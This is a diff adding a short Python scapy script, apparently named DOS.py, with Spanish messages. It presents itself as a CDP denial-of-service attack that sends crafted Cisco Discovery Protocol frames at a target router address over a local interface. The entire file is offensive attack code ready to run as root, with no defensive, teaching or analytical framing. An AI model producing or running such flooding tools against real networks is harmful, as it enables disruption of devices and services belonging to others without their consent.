@@ -1,0 +1,42 @@
+#!/usr/bin/env python3
+from scapy.all import *
+from scapy.contrib.cdp import *
+import time
+import sys
+import os
+
+def cdp_dos(target_ip, interface, count=100):
+    print(f"[*] Iniciando ataque CDP DoS contra {target_ip}")
+    print(f"[*] Usando interfaz {interface}")
+    print(f"[*] Enviando {count} paquetes...")
+    
+    packet = Ether(dst="01:00:0c:cc:cc:cc") / \
+             LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / \
+             SNAP(OUI=0x00000c, code=0x2000) / \
+             CDPv2_HDR(vers=2, ttl=180) / \
+             CDPAddrRecordIPv4(addr=target_ip)
+    
+    try:
+        for i in range(count):
+            sendp(packet, iface=interface, verbose=False)
+            if i % 10 == 0:
+                print(f"[+] Paquetes enviados: {i+1}")
+            time.sleep(0.1)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Detenido por el usuario")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
+    # Verificar root
+    if os.geteuid() != 0:
+        print("[!] Ejecuta con: sudo python3 DOS.py")
+        sys.exit(1)
+    
+    # Configuración
+    TARGET_IP = "192.168.1.1"
+    INTERFACE = "eth0"
+    PACKET_COUNT = 50
+    
+    cdp_dos(TARGET_IP, INTERFACE, PACKET_COUNT)
